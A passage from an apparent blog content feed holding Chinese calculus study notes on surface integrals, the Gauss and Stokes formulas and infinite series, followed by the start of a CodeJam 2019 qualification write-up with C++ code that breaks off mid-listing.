x}</script><p>在$G$内恒成立。</p><p>也就是$\text{d}u=P(x,y)\text{d}x+Q(x,y)\text{d}y$</p><script type="math/tex; mode=display">u(x,y)=\int_{(x_0,y_0)}^{(x,y)}P(s,t)\text{d}s+Q(s,t)\text{d}t</script><p>与路径无关也就是变成折线路径</p><script type="math/tex; mode=display">u(x,y)=\int_{x_0}^{x}P(x,y_0)\text{d}x+\int_{y_0}^{y}Q(x,y)\text{d}y</script><p>推论：设区域$G$是一个单连通区域，若函数$P(x,y),Q(x,y)$在$G$内具有一阶连续偏导数，则曲线积分$\int_{L}P\text{d}x+Q\text{d}y$在$G$内与路径无关的充分必要条件是<br>在$G$内存在函数$u(x,y)$，使$\text{d}u=P\text{d}x+Q\text{d}y$</p><h3 id="对面积的曲面积分"><a href="#对面积的曲面积分" class="headerlink" title="对面积的曲面积分"></a>对面积的曲面积分</h3><h4 id="概念及性质"><a href="#概念及性质" class="headerlink" title="概念及性质"></a>概念及性质</h4><p>定义： 设曲面$\Sigma$是光滑的，函数$f(x,y,z)$在$\Sigma$上有界，把$\Sigma$任意分成$n$小块$\Delta S_i$（$\Delta S_i$同时也代表第$i$小块曲面的面积），设$(\xi_i,\eta_i,\zeta_i)$是$\Delta S_i$上任意取定的一点，做乘积$f(\xi_i,\eta_i,\zeta_i)\Delta S_i$，并作和$\sum_{i=1}^nf(\xi_i,\eta_i,\zeta_i)\Delta S_i$，如果当各小块曲面的直径最大值$\lambda \rightarrow 0$时，这和的极限总存在，且与曲面$\Sigma$的分法以及点$(\xi_i,\eta_i,\zeta_i)$的取法无关，那么称此极限为函数$f(x,y,z)$在曲面$\Sigma$上<strong>对面积的曲面积分</strong>或<strong>第一类曲面积分</strong>，记作$\iint_{\Sigma}f(x,y,z)\text{d}S$，即</p><script type="math/tex; mode=display">\iint_{\Sigma}f(x,y,z)\text{d}S=\lim_{\lambda \rightarrow 0}\sum_{i=1}^{n}f(\xi_i,\eta_i,\zeta_i)\Delta S_i</script><p>其中，$f(x,y,z)$叫做<strong>被积函数</strong>，$\Sigma$叫做<strong>积分曲面</strong>。</p><script type="math/tex; mode=display">\iint_{\Sigma}f(x,y,z)\text{d}S=\iint_{\Sigma_1}f(x,y,z)\text{d}S+\iint_{\Sigma_2}f(x,y,z)\text{d}S,\Sigma=\Sigma_1+\Sigma_2</script><p>性质跟对弧长的曲线积分相似。</p><h4 id="计算法"><a href="#计算法" class="headerlink" title="计算法"></a>计算法</h4><p>转化成二重积分</p><script type="math/tex; mode=display">\iint_{\Sigma}f(x,y,z)\text{d}S=\iint_{D_{x,y}}f[x,y,z(x,y)]\sqrt{1+z_x^2(x,y)+z_y^2(x,y)}\text{d}x\text{d}y</script><h3 id="对坐标的曲面积分"><a href="#对坐标的曲面积分" class="headerlink" title="对坐标的曲面积分"></a>对坐标的曲面积分</h3><h4 id="概念和性质"><a href="#概念和性质" class="headerlink" title="概念和性质"></a>概念和性质</h4><p>对于曲面$z=z(x,y)$，如果取它的法向量$n$指向朝上，我们就认为取定曲面上侧；又如，对于闭曲面如果取它的法向量指向朝外，我们就认为取定曲面的外侧，这种取定了法向量亦即选定了侧的曲面，就称为<strong>有向曲面</strong>。</p><p>小曲面$\Delta S$在有向曲面上的投影，$(\Delta \sigma)_ {xy}$为投影区域面积，$\gamma$为各点处的法向量与$z$轴的夹角</p><script type="math/tex; mode=display">(\Delta S)_ {xy}=\left\{\begin{matrix}(\Delta \sigma)_ {xy},&& \cos \gamma >0\\ -(\Delta \sigma)_ {xy},&& \cos \gamma <0\\ 0,&& \cos \gamma \equiv 0\end{matrix}\right.</script><p>定义 设$\Sigma$为光滑的有向曲面，函数$R(x,y,z)$在$\Sigma$上有界，把$\Sigma$任意分成$n$块小曲面$\Delta S_i$（$\Delta S_i$同时又表示第$i$块小曲面的面积），$\Delta S_i$在$xOy$面上的投影为$(\Delta S_i)_ {xy}$，$(\xi_i,\eta_i,\zeta_i)$是$\Delta S_i$上任意取定的一点，作乘积$R(\xi_i,\eta_i,\zeta_i)(\Delta S_i)_ {xy}$，并作和$\sum_{i=1}^{n}R(\xi_i,\eta_i,\zeta_i)(\Delta S_i)_ {xy}$，如果当各小块曲面的直径的最大值$\lambda \rightarrow 0$时，这和的极限总存在，且与曲面$\Sigma$的分法及点$(\xi_i,\eta_i,\zeta_i)$的取法无关，那么称此极限为函数$R(x,y,z)$在有向曲面$\Sigma$上<strong>对坐标$x,y$的曲面积分</strong>，记作$\iint_{\Sigma}R(x,y,z)\text{d}x\text{d}y$<br>即</p><script type="math/tex; mode=display">\iint_{\Sigma}R(x,y,z)\text{d}x\text{d}y=\lim_{\lambda \rightarrow 0}\sum_{i=1}^{n}R(\xi_i,\eta_i,\zeta_i)(\Delta S_i)_ {xy}</script><p>类似定义对坐标$x,z$和对坐标$y,z$的曲面积分</p><script type="math/tex; mode=display">\iint_{\Sigma}P(x,y,z)\text{d}y\text{d}z=\lim_{\lambda \rightarrow 0}\sum_{i=1}^{n}R(\xi_i,\eta_i,\zeta_i)(\Delta S_i)_ {yz}</script><script type="math/tex; mode=display">\iint_{\Sigma}Q(x,y,z)\text{d}x\text{d}z=\lim_{\lambda \rightarrow 0}\sum_{i=1}^{n}R(\xi_i,\eta_i,\zeta_i)(\Delta S_i)_ {xz}</script><p>合并</p><script type="math/tex; mode=display">\iint_{\Sigma}P(x,y,z)\text{d}y\text{d}z+Q(x,y,z)\text{d}x\text{d}z+R(x,y,z)\text{d}x\text{d}y</script><p>对坐标的曲面积分具有对坐标的曲线积分类似的性质</p><script type="math/tex; mode=display">\iint_{\Sigma}P\text{d}y\text{d}z+Q\text{d}x\text{d}z+R\text{d}x\text{d}y=\iint_{\Sigma_1}P\text{d}y\text{d}z+Q\text{d}x\text{d}z+R\text{d}x\text{d}y+\iint_{\Sigma_2}P\text{d}y\text{d}z+Q\text{d}x\text{d}z+R\text{d}x\text{d}y,\Sigma=\Sigma_1+\Sigma_2</script><p>设$\Sigma$是有向曲面，$\Sigma^{-}$表示与$\Sigma$取相反侧的有向曲面，则</p><script type="math/tex; mode=display">\iint_{\Sigma^{-}}P\text{d}y\text{d}z=-\iint_{\Sigma}P\text{d}y\text{d}z</script><script type="math/tex; mode=display">\iint_{\Sigma^{-}}Q\text{d}x\text{d}z=-\iint_{\Sigma}Q\text{d}x\text{d}z</script><script type="math/tex; mode=display">\iint_{\Sigma^{-}}R\text{d}x\text{d}y=-\iint_{\Sigma}R\text{d}x\text{d}y</script><p>关于对坐标的曲面积分，我们必须注意积分曲面所取的侧。</p><h4 id="计算法-1"><a href="#计算法-1" class="headerlink" title="计算法"></a>计算法</h4><p>根据上下侧，转化成二重积分计算</p><script type="math/tex; mode=display">\iint_{\Sigma}R(x,y,z)\text{d}x\text{d}y=\pm \iint_{D_{xy}}R[x,y,z(x,y)]\text{d}x\text{d}y</script><script type="math/tex; mode=display">\iint_{\Sigma}P(x,y,z)\text{d}y\text{d}z=\pm \iint_{D_{yz}}P[x(y,z),y,z]\text{d}y\text{d}z</script><script type="math/tex; mode=display">\iint_{\Sigma}Q(x,y,z)\text{d}x\text{d}z=\pm \iint_{D_{xy}}Q[x,y(x,z),z]\text{d}x\text{d}z</script><h4 id="两类曲面积分之间的联系"><a href="#两类曲面积分之间的联系" class="headerlink" title="两类曲面积分之间的联系"></a>两类曲面积分之间的联系</h4><script type="math/tex; mode=display">\iint_{\Sigma}P\text{d}y\text{d}z+Q\text{d}x\text{d}z+R\text{d}x\text{d}y=\iint_{\Sigma}(P\cos \alpha+Q\cos \beta+R\cos\gamma)\text{d}S</script><p>向量形式</p><script type="math/tex; mode=display">\iint_{\Sigma}A\cdot \text{d}S=\iint_{\Sigma}A\cdot n\text{d}S,A=(P,Q,R),n=(\cos \alpha,\cos \beta, \cos \gamma)</script><p>$\text{d}\mathbf{S}=\mathbf{n}\text{d}S=(\text{d}y\text{d}z,\text{d}x\text{d}z,\text{d}x\text{d}y)$称为<strong>有向曲面元</strong>。</p><h3 id="高斯公式"><a href="#高斯公式" class="headerlink" title="高斯公式"></a>高斯公式</h3><p>定理1 设空间闭区域$\Omega$是由分片光滑的闭曲面$\Sigma$所围成，若函数$P(x,y,z),Q(x,y,z),R(x,y,z)$在$\Omega$上具有一阶连续偏导数，则有</p><script type="math/tex; mode=display">\iint_{\Omega}\left ( \frac{\partial P}{\partial x} + \frac{\partial Q}{\partial y}+ \frac{\partial R}{\partial z} \right )\text{d} v=\iint_{\Sigma}P\text{d}y\text{d}z+Q\text{d}z\text{d}x+R\text{d}x\text{d}y</script><p>或</p><script type="math/tex; mode=display">\iint_{\Omega}\left ( \frac{\partial P}{\partial x} + \frac{\partial Q}{\partial y}+ \frac{\partial R}{\partial z} \right )\text{d} v=\iint_{\Sigma}(P\cos \alpha + Q\cos \beta + R\cos \gamma)\text{d}S</script><p>这里$\Sigma$是$\Omega$的整个边界曲面的外侧，$\cos \alpha,\cos \beta, \cos \gamma$是在$\Sigma$在点$(x,y,z)$处的法向量的方向余弦，这个公式叫做<strong>高斯公式</strong>。</p><p>（将三重积分与曲面积分联系）</p><script type="math/tex; mode=display">\iint_{\Omega}u\Delta v\text{d}x\text{d}y\text{d}z=\iint_{\Sigma}\frac{\partial v}{\partial n}\text{d}S-\iiint_{\Omega}\left ( \frac{\partial u}{\partial x}\frac{\partial v}{\partial x}+\frac{\partial u}{\partial y}\frac{\partial v}{\partial y}+\frac{\partial u}{\partial z}\frac{\partial v}{\partial z}\right )\text{d}x\text{d}y\text{d}z</script><p>其中$\Sigma$是闭区域$\Omega$的整个边界曲面，$\frac{\partial v}{\partial n}$为函数$v(x,y,z)$沿$\Sigma$的外法线方向的方向导数，符号$\Delta=\frac{\partial ^2}{\partial x^2}+\frac{\partial ^2}{\partial y^2}+\frac{\partial ^2}{\partial z^2}$称为<strong>拉普拉斯（Laplace）算子</strong>，这个公式叫做<strong>格林第一公式</strong>。</p><script type="math/tex; mode=display">\iiint_{\Omega}(u\Delta v-v\Delta u)\text{d}x\text{d}y\text{d}z=\iint_{\Sigma}\left (u\frac{\partial v}{\partial n}-v\frac{\partial u}{\partial n}\right )</script><p>其中$\Sigma$是空间闭区域$\Omega$的整个边界曲面，这个公式叫做<strong>格林第二公式</strong>。</p><h3 id="斯托克斯公式"><a href="#斯托克斯公式" class="headerlink" title="斯托克斯公式"></a>斯托克斯公式</h3><p>定理1 设$\Gamma$为分段光滑的空间有向闭曲线，$\Sigma$是以$\Gamma$为边界的分片光滑的有向曲面，$\Gamma$的正向与$\Sigma$的侧符合右手规则，若函数$P(x,y,z),Q(x,y,z),R(x,y,z)$在曲面$\Sigma$（连同边界$\Gamma$）上具有一阶连续偏导数，则有</p><script type="math/tex; mode=display">\iint_{\Sigma}\left ( \frac{\partial R}{\partial y}-\frac{\partial Q}{\partial z}\text{d}y \text{d}z+\left ( \frac{\partial P}{\partial z}-\frac{\partial R}{\partial x}\text{d}x \text{d}z+\left ( \frac{\partial Q}{\partial x}-\frac{\partial P}{\partial y}\text{d}x \text{d}y \right ) \right ) \right )=\oint_{\Gamma}P\text{d}x+Q\text{d}y+R\text{d}z</script><p>这个公式叫做<strong>斯托克公式</strong>。</p><p>（将曲面积分转化成曲线积分）<br>根据两类曲面积分间的关系可以得到另一形式</p><script type="math/tex; mode=display">\iint_{\Sigma}\begin{vmatrix}\cos \alpha & \cos \beta & \cos \gamma \\ \frac{\partial}{\partial x} & \frac{\partial}{\partial y} & \frac{\partial}{\partial z}\\ P & Q & R\end{vmatrix}\text{d}S=\oint_{\Gamma}P\text{d}x+Q\text{d}y+R\text{d}z</script><h2 id="第十二章-无穷级数"><a href="#第十二章-无穷级数" class="headerlink" title="第十二章 无穷级数"></a>第十二章 无穷级数</h2><h3 id="常数项级数的概念性质"><a href="#常数项级数的概念性质" class="headerlink" title="常数项级数的概念性质"></a>常数项级数的概念性质</h3><h4 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h4><p>一般地，如果给定一个数列</p><script type="math/tex; mode=display">u_1,u_2,u_3,...,u_n,...</script><p>那么由这数列构成的表达式</p><script type="math/tex; mode=display">u_1+u_2+u_3+...+u_n+...</script><p>叫做<strong>（常数项）无穷级数</strong>，简称<strong>（常数项）级数</strong>，记为$\sum_{i=1}^{\infty}u_i$<br>其中第$n$项$u_n$叫做级数的<strong>一般项</strong>。</p><p>定义： 如果级数$\sum_{i=1}^{\infty}u_i$的部分和数列$\{s_n\}$有极限$s$，即</p><script type="math/tex; mode=display">\lim_{n\rightarrow \infty}s_n=s</script><p>那么称无穷级数$\sum_{i=1}^{\infty}u_i$<strong>收敛</strong>，这时极限$s$叫做这级数的<strong>和</strong>，并写成</p><script type="math/tex; mode=display">s=u_1+u_2+u_3+...+u_n+...</script><p>如果$\{s_n\}$没有极限，那么称无穷级数<strong>发散</strong></p><script type="math/tex; mode=display">r_n=s-s_n=u_{n+1}+u_{n+2}+...</script><p>叫做级数的<strong>余项</strong></p><h4 id="性质-1"><a href="#性质-1" class="headerlink" title="性质"></a>性质</h4><ul><li>性质1 如果级数$\sum_{n=1}^{\infty}u_n$收敛于和$s$，那么级数$\sum_{n=1}^{\infty}ku_n$也收敛，且其和为$ks$<br>即，级数的每一项同乘一个不为零的常数后，它的收敛性不会改变</li><li>性质2 如果级数$\sum_{n=1}^{\infty}u_n$与$\sum_{n=1}^{\infty}v_n$分别收敛于$s$和$\sigma$，那么级数$\sum_{n=1}^{\infty}(u_n\pm v_n)$也收敛，且其和为$s\pm \sigma$<br>即，两个收敛级数可以逐项相加与逐项相减</li><li>性质3 在级数中去掉、加上或改变有限项，不会改变级数的收敛性。</li><li>性质4 如果级数$\sum_{n=1}^{\infty}u_n$收敛，那么对这级数的项任意加括号后所成的级数$(u_2+…+u_{n_1})+(u_{n_1+1}+…u_{n_2})+…$仍收敛，且其和不变.</li><li>性质5（级数收敛的必要条件） 如果级数$\sum_{n=1}^{\infty}u_n$收敛，那么它的一般项$u_n$趋于零，即$\lim_{n\rightarrow 0}u_n=0$</li></ul><h4 id="柯西审敛原理"><a href="#柯西审敛原理" class="headerlink" title="柯西审敛原理"></a>柯西审敛原理</h4><p>定理（柯西审敛原理） 级数$\sum_{n=1}^{\infty}u_n$收敛的充分必要条件为：对任意给定的正数$\varepsilon $，总存在正整数$N$，使得当$n&gt;N$时，对于任意的正整数$p$，都有$|u_{n+1}+u_{n+2}+…+u_{n+p}|&lt;\varepsilon$成立。</p><h3 id="常数项级数的审敛法"><a href="#常数项级数的审敛法" class="headerlink" title="常数项级数的审敛法"></a>常数项级数的审敛法</h3><h4 id="正项级数及其审敛法"><a href="#正项级数及其审敛法" class="headerlink" title="正项级数及其审敛法"></a>正项级数及其审敛法</h4><p>各项都是正数或零的级数称为<strong>正项级数</strong>。</p><ul><li>定理1 正项级数$\sum_{n=1}^{\infty}u_n$收敛的充分必要条件是：它的部分和数列$\{s_n\}$有界。</li><li>定理2（比较审敛法） 设$\sum_{n=1}^{\infty}u_n$和$\sum_{n=1}^{\infty}v_n$都是正项数列，且$u_n\leqslant v_n(n=1,2,…)$。若级数$\sum_{n=1}^{\infty}v_n$收敛，则级数$\sum_{n=1}^{\infty}u_n$收敛；反之，若级数$\sum_{n=1}^{\infty}u_n$发散，则级数$\sum_{n=1}^{\infty}v_n$发散。</li><li>推论 设$\sum_{n=1}^{\infty}u_n$和$\sum_{n=1}^{\infty}v_n$都是正项数列，如果级数$\sum_{n=1}^{\infty}v_n$收敛，且存在正整数$N$，使当$n\geqslant N$时有$u_n\leqslant kv_n(k&gt;0)$成立，那么级数$\sum_{n=1}^{\infty}u_n$收敛；如果级数$\sum_{n=1}^{\infty}v_n$发散，且当$n\geqslant N$时有$u_n\geqslant kv_n(k&gt;0)$成立，那么级数$\sum_{n=1}^{\infty}u_n$发散。</li><li>定理3（比较审敛法的极限形式） 设$\sum_{n=1}^{\infty}u_n$和$\sum_{n=1}^{\infty}v_n$都是正项级数<br>（1）如果$\lim_{n\rightarrow \infty}\frac{u_n}{v_n}=l(0\leqslant l&lt;+\infty)$，且级数$\sum_{n=1}^{\infty}v_n$收敛，那么级数$\sum_{n=1}^{\infty}u_n$收敛；<br>（2）如果$\lim_{n\rightarrow \infty}\frac{u_n}{v_n}=l&gt;0$或$\lim_{n\rightarrow \infty}\frac{u_n}{v_n}=+\infty$，且级数$\sum_{n=1}^{\infty}v_n$发散，那么级数$\sum_{n=1}^{\infty}u_n$发散；</li><li>定理4（比值审敛法，达朗贝尔（d’Alembert）判别法） 设$\sum_{n=1}^{\infty}u_n$为正项级数，如果$\lim_{n\rightarrow \infty}\frac{u_{n+1}}{n_n}=\rho$，那么当$\rho &lt; 1$时级数收敛，$\rho &gt; 1$（或$\lim_{n\rightarrow \infty}\frac{u_{n+1}}{n_n}=+\infty$）时级数发散，$\rho =1$时级数可能收敛也可能发散。</li><li>定理5（根值审敛法，柯西判别法） 设$\sum_{n=1}^{\infty}u_n$为正项级数，如果$\lim_{n\rightarrow \infty}\sqrt[n]{u_n}=p$，那么当$\rho <1$时级数收敛，$\rho>1$（或$\lim_{n\rightarrow \infty}\sqrt[n]{u_n}=+\infty$）时级数发散，$\rho =1$时级数可能收敛也可能发散。</1$时级数收敛，$\rho></li><li>定理6（极限审敛法） 设$\sum_{n=1}^{\infty}u_n$为正项级数<br>（1）如果$\lim_{n\rightarrow \infty}nu_n=l&gt;0$（或$\lim_{n\rightarrow \infty}nu_n=+\infty$），那么级数$\sum_{n=1}^{\infty}u_n$发散；<br>（2）如果$p&gt;1$，而$\lim_{n\rightarrow \infty}n^pu_n=l(0\leqslant l&lt;+\infty)$，那么级数$\sum_{n=1}^{\infty}u_n$收敛；</li></ul><h4 id="交错级数及其审敛法"><a href="#交错级数及其审敛法" class="headerlink" title="交错级数及其审敛法"></a>交错级数及其审敛法</h4><p>各项正负交错的级数称为<strong>交错级数</strong><br>如$u_1-u_2+u_3-u_4+…$或$-u_1+u_2-u_3+u_4-…$</p><ul><li>定理7（莱布尼茨定理） 如果交错级数$\sum_{i=1}^{\infty}(-1)^{n-1}u_n$，满足条件：<br>（1）$u_n\geqslant u_{n+1}(n=1,2,3,….)$<br>（2）$\lim_{n\rightarrow \infty}u_n=0$<br>那么级数收敛，且其和$s\leqslant u_1$，其余项$r_n$的绝对值$|r_n|\leqslant u_{n+1}$</li></ul><h4 id="绝对收敛与条件收敛"><a href="#绝对收敛与条件收敛" class="headerlink" title="绝对收敛与条件收敛"></a>绝对收敛与条件收敛</h4><p>如果级数$\sum_{i=1}^{\infty}u_n$各项的绝对值所构成的正项级数$\sum_{i=1}^{\infty}|u_n|$收敛，那么称级数$\sum_{i=1}^{\infty}u_n$<strong>绝对收敛</strong>；如果级数$\sum_{i=1}^{\infty}u_n$收敛，而级数$\sum_{i=1}^{\infty}|u_n|$发散，那么称级数$\sum_{i=1}^{\infty}u_n$<strong>条件收敛</strong></p><ul><li>定理8 如果级数$\sum_{i=1}^{\infty}u_n$绝对收敛，那么级数$\sum_{i=1}^{\infty}u_n$必定收敛。</li></ul><h3 id="幂级数"><a href="#幂级数" class="headerlink" title="幂级数"></a>幂级数</h3><h4 id="函数项级数的概念"><a href="#函数项级数的概念" class="headerlink" title="函数项级数的概念"></a>函数项级数的概念</h4><p>如果给定一个定义在区间$I$上的函数列，</p><script type="math/tex; mode=display">u_1(x),u_2(x),u_3(x),...,u_n(x),...</script><p>那么由着函数列构成的表达式</p><script type="math/tex; mode=display">u_1(x)+u_2(x)+u_3(x)+...+u_n(x)+...</script><p>称为定义在区间$I$上的<strong>（函数项）无穷级数</strong>，简称<strong>（函数项）级数</strong>。<br>对于每一个确定值$x_0\in I$，函数项级数成为常数项级数</p><script type="math/tex; mode=display">u_1(x_0)+u_2(x_0)+u_3(x_0)+...+u_n(x_0)+...</script><p>如果这个级数收敛，就称点$x_0$是函数项级数的<strong>收敛点</strong>；如果这个级数发散，就称点$x_0$是函数项级数的<strong>发散点</strong>。函数项级数收敛点的全体称为它的<strong>收敛域</strong>，发散点的全体称为它的<strong>发散域</strong>。</p><h4 id="幂级数及其收敛性"><a href="#幂级数及其收敛性" class="headerlink" title="幂级数及其收敛性"></a>幂级数及其收敛性</h4><p>各项都是常数乘幂函数的函数项级数，即所谓<strong>幂级数</strong>，它的形式是</p><script type="math/tex; mode=display">\sum_{n=0}^{\infty}a_nx_n=a_0+a_1x+a_2x^2+...+a_nx^n+...</script><p>其中$a_0,a_1,…,a_n,…$叫做<strong>幂级数的系数</strong>。</p><ul><li>定理1（阿贝尔（Abel）定理） 如果级数$\sum_{n=0}^{\infty}a_nx^n$当$x=x_0(x_0\neq 0)$时收敛，那么适合不等式$|x|&lt;|x_0|$的一切$x$使这幂级数绝对收敛。反之，如果级数$\sum_{n=0}^{\infty}a_nx^n$当$x=x_0$时法赛，那么适合不等式$|x|&gt;|x_0|$的一切$x$使这幂级数发散。</li><li>推论 如果幂级数$\sum_{n=0}^{\infty}a_nx^n$不是仅在$x=0$一点收敛，也不是在整个数轴上都收敛，那么必有一个确定的正数$R$存在，使得<br>当$|x| &lt; R$时，幂级数绝对收敛；<br>当$|x| &gt; R$时，幂级数发散；<br>当$x=\pm R$时，幂级数可能收敛也可能发散<br>正数$R$通常叫做幂级数的<strong>收敛半径</strong>，开区间$(-R,R)$叫做幂级数的<strong>收敛区间</strong>。</li><li>定理2 如果<script type="math/tex; mode=display">\lim_{n\rightarrow \infty}\left | \frac{a_{n+1}}{a_n}\right |=\rho</script>其中$a_n,a_{n+1}$是幂级数$\sum_{n=0}^{\infty}a_nx^n$的相邻两项的系数，那么这幂级数的收敛半径<script type="math/tex; mode=display">R=\left\{\begin{matrix}\frac{1}{\rho},&&\rho \neq 0\\ +\infty,&&\rho =0\\ 0,&&\rho=+\infty\end{matrix}\right.</script></li></ul><h4 id="幂级数的运算"><a href="#幂级数的运算" class="headerlink" title="幂级数的运算"></a>幂级数的运算</h4><p>幂级数的四则运算<br>加法减法乘法收敛半径都是两运算级数中较小的，除法转化成乘法来求解，收敛区间可能比原来两级数的收敛区间小得多。</p><ul><li>性质1 幂级数$\sum_{n=0}^{\infty}a_nx^n$的和函数$s(x)$在其收敛域$I$上连续。</li><li>性质2 幂级数$\sum_{n=0}^{\infty}a_nx^n$的和函数在其收敛域$I$上可积，并有逐项积分公式<script type="math/tex; mode=display">\int_{0}^{x}s(t)\text{d}t=\int_{0}^{x}[\sum_{n=0}^{\infty}a_nt^n]\text{d}t=\sum_{n=0}^{\infty}\int_{0}^{x}a_nt^n\text{d}t=\sum_{n=0}^{\infty}\frac{a_n}{n+1}x^{n+1}(x\in I)</script>逐项积分后所得到的幂级数和原级数有相同的收敛半径。</li><li>性质3 幂级数$\sum_{n=0}^{\infty}a_nx^n$的和函数在其收敛区间$(-R,R)$内可导，且有逐项求导公式<script type="math/tex; mode=display">s'(x)=\left (\sum_{n=0}^{\infty}a_nx^n\right )'=\sum_{n=0}^{\infty}(a_nx^n)'=\sum_{n=0}^{\infty}na_nx^{n-1}(|x|<R)</script>逐项求导后所得到的幂级数和原级数有相同的收敛半径<br>反复应用上述结论可得：幂级数$\sum_{n=0}^{\infty}a_nx^n$的和函数$s(x)$在其收敛区间$(-R,R)$内具有任意阶导数。</li></ul><h3 id="函数展开成幂级数"><a href="#函数展开成幂级数" class="headerlink" title="函数展开成幂级数"></a>函数展开成幂级数</h3><p>是否能找到这样一个幂级数，它在某区间内收敛，且其和恰好就是给定的函数$f(x)$，如果能找到这样的幂级数，我们就说，函数$f(x)$在该区间内能展开成幂级数。</p><p>假设函数$f(x)$在点$x_0$的某邻域$U(x_0)$能展开成幂级数，即有</p><script type="math/tex; mode=display">f(x)=a_0+a_1(x-x_0)+a_2(x-x_0)^2+...+a_n(x-x_0)^n...,x\in U(x_0)</script><script type="math/tex; mode=display">f^{(n)}(x)=n!a_n+(n+1)!a_{n+1}(x-x_0)+\frac{(n+2)!}{2!}a_{n+2}(x-x_0)^2+...</script><p>由此可得</p><script type="math/tex; mode=display">f^{(n)}(x_0)=n!a_n</script><p>于是</p><script type="math/tex; mode=display">a_n=\frac{1}{n!}f^{(n)}(x_0)</script><p>该幂级数必为</p><script type="math/tex; mode=display">f(x_0)+f'(x_0)(x-x_0)+...+\frac{1}{n!}f^{(n)}(x_0)(x-x_0)^n+...=\sum_{n=0}^{\infty}\frac{1}{n!}f^{(n)}(x_0)(x-x_0)^n</script><p>展开式必为</p><script type="math/tex; mode=display">f(x)=\sum_{n=0}^{\infty}\frac{1}{n!}f^{(n)}(x_0)(x-x_0)^n,x\in U(x_0)</script><p>幂级数叫做函数$f(x)$在点$x_0$处的<strong>泰勒级数</strong>，展开式叫做在$x_0$处的<strong>泰勒展开式</strong>。</p><p>定理 设函数在点$x_0$的某一邻域$U(x_0)$内具有各阶导数，则$f(x)$在该邻域内能展开成泰勒级数的充分必要条件是在该邻域内$f(x)$的泰勒公式中的余项$R_n(x)$当$n\rightarrow \infty$时的极限为零，即</p><script type="math/tex; mode=display">\lim_{n\rightarrow \infty}R_n(x)=0,x\in U(x_0)</script><p>当$x_0=0$时可以得到麦克劳林级数和麦克劳林展开式。</p><h3 id="函数的幂级数展开式的应用"><a href="#函数的幂级数展开式的应用" class="headerlink" title="函数的幂级数展开式的应用"></a>函数的幂级数展开式的应用</h3><h4 id="微分方程的幂级数解法"><a href="#微分方程的幂级数解法" class="headerlink" title="微分方程的幂级数解法"></a>微分方程的幂级数解法</h4><p>定理 如果方程$y’’+P(x)y’+Q(x)y=0$中的系数$P(x)$与$Q(x)$可在$-R&lt; x &lt; R$内展开为$x$的幂级数，那么在$-R &lt; x&lt; R$内方程必有形如$y=\sum_{n=0}^{\infty}a_nx^n$的解。</p><h4 id="欧拉公式"><a href="#欧拉公式" class="headerlink" title="欧拉公式"></a>欧拉公式</h4><script type="math/tex; mode=display">e^{xi}=\cos x+i\sin x</script><script type="math/tex; mode=display">\left\{\begin{matrix}\cos x=\frac{e^{xi}+e^{-xi}}{2}\\ \sin x=\frac{e^{xi}-e^{-xi}}{2}\end{matrix}\right.</script><h3 id="傅里叶级数"><a href="#傅里叶级数" class="headerlink" title="傅里叶级数"></a>傅里叶级数</h3><h3 id="一般周期的傅里叶级数"><a href="#一般周期的傅里叶级数" class="headerlink" title="一般周期的傅里叶级数"></a>一般周期的傅里叶级数</h3><h2 id="总犯错的地方总结"><a href="#总犯错的地方总结" class="headerlink" title="总犯错的地方总结"></a>总犯错的地方总结</h2><p>=-=..我tcl…有些地方老错..<br>一个就是上限是函数下限是0的时候，别偷懒都算一下啊…<br>积分换元的时候记得上下限也换了…</p>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> math </tag>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CodeJam 2019 Qualification Round</title>
      <link href="/blog/problem-codejam-2019-qualification-round/"/>
      <url>/blog/problem-codejam-2019-qualification-round/</url>
      
        <content type="html"><![CDATA[<p>某未出土选手出土训练还没做就来打比赛了。<br>还好我设置了提醒，不然就忘记了…</p><p>只做了T1和T2</p><h3 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h3><p><strong>Description</strong><br>给一个数$n$，表示成两个数相加的形式，$A+B=n$，其中$A$，$B$的各位不能包含$4$<br>$T\leqslant 100, n\leqslant 10^{100}$</p><p><strong>Solution</strong><br>每位独立的来做就好了…<br>一共三个点，第一个点$10^5$，第二个点$10^9$，最后一个点才$10^{100}$<br>暴力可以过第一个点，随机化可以过第二个点，然后我最后写的这个应该可以过第三个点。<br>一开始以为不能输出0的，怕被111这种卡掉，然后发现好像可以，然后被100卡掉了…最后修改了一下</p><p><strong>Code</strong><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">105</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ch[N];</span><br><span class="line"><span class="keyword">int</span> ans1[N], ans2[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">out</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> ans[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(; s&lt;l; s++) <span class="keyword">if</span>(ans[s]) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span>(s==l) <span class="built_in">putchar</span>(<span class="string">'0'</span>);</span><br><span class="line">    <span class="keyword">for</span>(; s&lt;l; s++) <span class="built_in">putchar</span>(<span 